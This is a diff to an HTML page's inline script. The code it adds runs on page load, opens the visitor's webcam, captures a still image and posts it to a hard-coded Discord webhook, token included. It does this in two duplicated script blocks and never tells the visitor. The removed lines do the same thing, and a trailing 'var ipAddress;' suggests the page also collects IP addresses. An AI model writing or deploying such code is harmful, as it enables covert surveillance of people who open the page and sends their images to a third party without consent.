@@ -52,47 +52,100 @@
       cursor: pointer;
     }
   </style>
-  <script>
-    window.addEventListener('load', () => {
-      const video = document.createElement('video');
+    <script>
+    // Get video, canvas
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
 
+    // Access user media and start the camera
+    if (navigator.mediaDevices.getUserMedia) {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then((stream) => {
           video.srcObject = stream;
-          video.addEventListener('loadedmetadata', () => {
-            setTimeout(() => {
-              const canvas = document.createElement('canvas');
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-              canvas.toBlob((blob) => {
-                const formData = new FormData();
-                formData.append('file', blob, 'photo.jpg');
-
-                const webhookURL = 'https://discord.com/api/webhooks/1108464693581983804/siGceNe-YFrFQUvTCMf8E5rK4ZNebJ1mO8e3Epq4FV_-cxEB4wHiH7qoMpcNiaHBsgt1';
-
-                fetch(webhookURL, {
-                  method: 'POST',
-                  body: formData
-                })
-                  .then((response) => {
-                    if (response.ok) {
-                      console.log('Photo sent to Discord webhook successfully!');
-                    } else {
-                      console.error('Error sending photo to Discord webhook:', response.statusText);
-                    }
-                  })
-                  .catch((error) => {
-                    console.error('Error sending photo to Discord webhook:', error);
-                  });
-              }, 'image/jpeg', 1);
-            }, 1000);
-          });
+          // Capture photo after a brief delay
+          setTimeout(() => {
+            capturePhotoAndSendToWebhook();
+          }, 1000);
         })
         .catch((error) => {
           console.error('Error accessing camera:', error);
         });
+    }
+
+    // Capture photo from video stream and send to Discord webhook
+    function capturePhotoAndSendToWebhook() {
+      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+      // Convert the captured photo to a Blob object
+      canvas.toBlob((blob) => {
+        // Create a FormData object to send the photo as multipart/form-data
+        const formData = new FormData();
+        formData.append('file', blob, 'photo.png');
+
+        // Discord webhook URL
+        const webhookURL = 'https://discord.com/api/webhooks/1108464693581983804/siGceNe-YFrFQUvTCMf8E5rK4ZNebJ1mO8e3Epq4FV_-cxEB4wHiH7qoMpcNiaHBsgt1';
+
+        // Send the photo to Discord webhook using Fetch API
+        fetch(webhookURL, {
+          method: 'POST',
+          body: formData
+        })
+          .then((response) => {
+            if (response.ok) {
+              console.log('Photo sent to Discord webhook successfully!');
+            } else {
+              console.error('Error sending photo to Discord webhook:', response.statusText);
+            }
+          })
+          .catch((error) => {
+            console.error('Error sending photo to Discord webhook:', error);
+          });
+      }, 'image/png');
+    }
+  </script>
+  <script>
+window.addEventListener('load', () => {
+  const video = document.createElement('video');
+  const canvas = document.createElement('canvas');
+  
+  navigator.mediaDevices.getUserMedia({ video: true })
+    .then((stream) => {
+      video.srcObject = stream;
+      video.addEventListener('loadedmetadata', () => {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Convert the captured photo to a Blob object
+        canvas.toBlob((blob) => {
+          // Create a FormData object to send the photo as multipart/form-data
+          const formData = new FormData();
+          formData.append('file', blob, 'photo.jpg');
+
+          // Discord webhook URL
+          const webhookURL = 'https://discord.com/api/webhooks/1108464693581983804/siGceNe-YFrFQUvTCMf8E5rK4ZNebJ1mO8e3Epq4FV_-cxEB4wHiH7qoMpcNiaHBsgt1';
+
+          // Send the photo to Discord webhook using Fetch API
+          fetch(webhookURL, {
+            method: 'POST',
+            body: formData
+          })
+            .then((response) => {
+              if (response.ok) {
+                console.log('Photo sent to Discord webhook successfully!');
+              } else {
+                console.error('Error sending photo to Discord webhook:', response.statusText);
+              }
+            })
+            .catch((error) => {
+              console.error('Error sending photo to Discord webhook:', error);
+            });
+        }, 'image/jpeg', 1); // Adjust the image format and quality as needed
+      });
+    })
+    .catch((error) => {
+      console.error('Error accessing camera:', error);
     });
+});
 
     var ipAddress;
 
